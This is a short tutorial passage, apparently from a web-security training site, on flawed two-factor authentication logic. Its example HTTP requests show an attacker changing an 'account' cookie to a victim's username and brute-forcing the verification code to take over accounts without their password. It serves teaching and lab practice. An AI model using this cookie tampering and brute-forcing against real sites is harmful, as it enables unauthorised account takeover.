## Flawed two-factor verification logic

Sometimes flawed logic in two-factor authentication means that after a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step.  
  
For example, the user logs in with their normal credentials in the first step as follows:  
```http POST /login-steps/first HTTP/1.1  
Host: vulnerable-website.com  
...  
username=carlos&password=qwerty`  
  
  
They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:  
`HTTP/1.1 200 OK  
Set-Cookie: account=carlos  
  
GET /login-steps/second HTTP/1.1  
Cookie: account=carlos`  
  
  
When submitting the verification code, the request uses this cookie to determine which account the user is trying to access:  
`POST /login-steps/second HTTP/1.1  
Host: vulnerable-website.com  
Cookie: account=carlos  
...  
verification-code=123456`  
  
  
In this case, an attacker could log in using their own credentials but then change the value of the `account` cookie to any arbitrary username when submitting the verification code.  
`POST /login-steps/second HTTP/1.1  
Host: vulnerable-website.com  
Cookie: account=victim-user  
...  
verification-code=123456`  
  
```

This is extremely dangerous if the attacker is then able to brute-force the verification code as it would allow them to log in to arbitrary users' accounts based entirely on their username. They would never even need to know the user's password.  
  
  
>LAB [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)